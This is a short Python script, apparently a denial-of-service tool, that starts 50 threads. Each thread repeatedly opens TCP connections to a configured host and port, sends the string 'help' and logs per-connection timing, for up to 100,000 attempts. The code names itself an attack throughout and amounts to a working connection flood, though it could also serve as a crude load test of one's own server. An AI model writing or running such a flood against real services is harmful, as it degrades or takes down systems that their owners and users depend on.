import socket
import threading
from datetime import datetime

from consts import HOST, PORT 

target  = HOST
port = PORT
attack_num = 0
total_ttl = 0

print("Sending Packets...")

def attack():
    global attack_num
    global total_ttl
    while attack_num < 100000:
      try:
        start = datetime.now()
        s = socket.socket()
        attack_num += 1
        s.connect((target, port))
        s.send(str.encode('help'))
      except:
        print('An error occured')
      finally:
        end = datetime.now()
        ttl = (end - start).total_seconds()
        total_ttl += ttl
        print(f'Packet {attack_num} sent, ttl: {round(ttl, 3)} seconds, mean_ttl: {round(total_ttl / attack_num, 3)} seconds')
        s.close()

for i in range(50):
    thread = threading.Thread(target=attack)
    thread.start()